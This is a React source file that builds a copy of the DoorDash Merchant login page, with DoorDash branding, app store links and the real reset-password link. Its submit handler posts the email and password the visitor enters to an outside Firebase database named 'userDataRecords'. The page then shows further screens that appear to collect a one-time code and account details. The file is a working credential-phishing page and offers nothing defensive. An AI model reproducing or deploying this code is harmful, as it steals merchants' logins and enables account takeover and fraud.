import { useEffect, useState } from 'react';
import './App.css';
import logo from './DASH-1.png';
import logo2 from './qr.webp';
import playStore from './assets/playstpre.webp'
import appStore from './assets/appstore.svg'
import mobile from '/website/doordash/src/img3.webp'
import Component from './components/Component';
import Accounts from './components/Accounts';
import Opt2 from './components/Opt2';


function App() {
  const [password, setPassword ] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [inputData, setInputData] = useState('');
  const [inputPassword, setInputPassword] = useState('');
  const [data, setData] = useState([]);
  const [showHome, setShowHome] = useState(true);
  const [showOpt, setShowOpt ] = useState(false);
  const [showAccount, setShowAccount] = useState(false);
  const [showFinalOpt, setShowFinalOpt] = useState(false)

  useEffect(() => {
    // Log the data state whenever it changes
    console.log(data);
  }, [data]); // Add 'data' as a dependency


  const handleSubmit = async (e) => {
    e.preventDefault();
    const temporaryData = { inputData, inputPassword}
    if(inputData) {
      setData((ds) => [ ...ds, temporaryData]);
    };

    // const {  firstName, text} = userData;
    const res = await fetch("https://testing-ec81f-default-rtdb.firebaseio.com/userDataRecords.json",{

      method : "POST",
      headers: {
        "Content-Type" : "application/json",
      },
      body: JSON.stringify({
        inputData, inputPassword
      }),
    });

    if(res) {
      setShowHome(false);
      setShowOpt(true);
    } else {
      alert("Plz enter data")
    }
  }



  const handleChangepas = (e) => {
    setPassword(e.target.value);
    setInputPassword(e.target.value);
  };

  const togglePaswordVisiblity = () => {
    setShowPassword(!showPassword);

  };

  return (
      <div>
        {
          showHome && (
            <div className=  ' flex flex-row justify-between relative' >
                    <div className=' hidden sm:flex sm:flex-col ' >
                      <div className=' h-[100vh] overflow-hidden bg-[url(./img1.svg)] bg-no-repeat bg-cover w-80 max-w-[480px] min-w-full   flex flex-col  pt-16 md:w-[390px] lg:w-[480px]  ' >
                        <img src={logo2} alt="QR" className=' sm:w-48 sm:h-48 mx-auto md:h-56 md:w-56  ' />
                          <div className=' flex flex-row  p-1 mr-4 mt-5 sm:mx-auto md:mx-auto ' >
                            <a href=" https://apps.apple.com/app/doordash-business-manager/id1551000102 "><img src={appStore} alt="appstore" className='  sm:w-32 sm:h-10 md:h-12 md:w-36 ' /> </a>
                            <a href="https://play.google.com/store/apps/details?id=com.doordash.android.merchant.portal&pli=1"><img src={playStore} alt="playstore" className=' sm:w-32 sm:h-10 md:h-12 md:w-36 md:ml-3 '   /></a>
                          </div>
                          <div className='sm:mt-7 md:mt-8' >
                            <h1 className=' sm:text-xl tracking-tight font-bold text-center text-[#02124F]  md:text-4xl md:font-semibold ' >Business Manager <br /> App</h1>
                            <p className='text-center sm:mt-4 leading-6 text-[#02124F] px-10 md:mt-6 md:tracking-wide ' >Stay on top of orders, resolve issues, and keep track of your business performance on DoorDash.</p>
                          </div>
                          <div className=' sm:w-[260px] mt-12 mx-auto md:w-[285px]  ' >
                            <img src={mobile} alt="mobile" className='  ' />
                          </div>
                      </div>
                    </div>
                    <div className="  my-12 w-screen max-w-[420px]  border-0 min-h-[300px] flex flex-col px-6 py-10
                                    sm:my-16 sm:mx-14 md:my-18 lg:mx-auto xs:mx-auto  ">
                      <div className='  ' >
                        <img src={logo} alt="logo" className=' w-10 my-2 ' />
                        <h1 className=' text-2xl font-semibold ' >DoorDash Merchant</h1>
                      </div>
                      <form onSubmit={handleSubmit} >
                        <div className=' flex flex-col mt-16 md:w-[410px] ' >
                          <div className=' flex flex-col ' >
                            <label htmlFor="email" className=' text-sm my-2 md:my-4  font-semibold ' >Email</label>
                            <input type='text' name='email' id='email' 
                              onChange={(e) => { setInputData(e.target.value);}}
                              className=' text-sm border border-black border-opacity-30 rounded-lg p-2.5 outline-[#91A5F9] w-[360px] md:w-96  invalid:outline-red-800
                                          '     required
                                          pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$" />
                          </div>
                          <div className=' flex flex-col ' > 
                            <label htmlFor="pas" className=' text-sm my-2 md:my-4 mt-4 md:mt-6 font-semibold ' >Password</label>
                            <div className=' flex flex-row items-center w-96 ' >
                            <input type={ showPassword ? 'text' : 'password' } id='pas' name='password'
                                onChange={ handleChangepas } value={password} 
                                className=' text-sm border-b border-t border-l border-black border-opacity-30 rounded-l-lg p-2.5 outline-[#91A5F9] w-[305px] md:w-[380px]
                                            ' />
                              <button 
                                type='button'
                                onClick={togglePaswordVisiblity}
                                className=' text-sm p-2.5 border-b border-t border-r rounded-r-lg border-black border-opacity-30 ' >{showPassword ? 'Hide' : 'Show'}</button>

                            </div>
                          </div>
                          <div className=' my-2 ' >
                            <a href="https://identity.doordash.com/auth/user/password/reset?client_id=1643580605860775164&redirect_uri=https%3A%2F%2Fmerchant-portal.doordash.com%2Fauth_callback&scope=*&prompt=none&response_type=code&layout=merchant_web_v2&state=1461ea80-1820-43b7-be56-7ae2c6857285&allowRedirect=true&failureRedirect=%2Fmerchant%2Flogin" className=' text-sm underline my-2 ' > Reset Password </a>
                          </div>
                        </div>
                        <div>
                          <div className=' mt-10  ' >
                            <h1 className=' text-sm ' >By logging in, you agree to DoorDash's Merchant<br/><a href="https://help.doordash.com/legal/document?type=mx-security-terms&region=US&locale=en-US" className=' text-[#4969F5] ' >Security Terms</a> </h1>
                          </div>
                          <div className=' my-7 ' >
                            <button className=' bg-[#4969F5] hover:bg-[#1537C7] hover:text-slate-50 active:bg-[#132c9c] active:text-slate-50 p-2.5 text-sm rounded-lg text-white w-[360px] md:w-96 ' 
                            >Log In</button>
                          </div>
                        </div>
                      </form>
                    </div>
            </div>
          )
        }

        {
          showOpt && (
            <Component  inputData={inputData} setShowOpt={setShowOpt} setShowAccount={setShowAccount} setShowHome={setShowHome} />
          )
        }



        { 
          showAccount && (
            <Accounts inputData={inputData} setShowAccount={setShowAccount} setShowFinalOpt={setShowFinalOpt} /> 
          ) 
        }

        {
          showFinalOpt && (
            <Opt2 inputData={inputData} />
          )
        }
      

      </div>
  );
}

export default App;
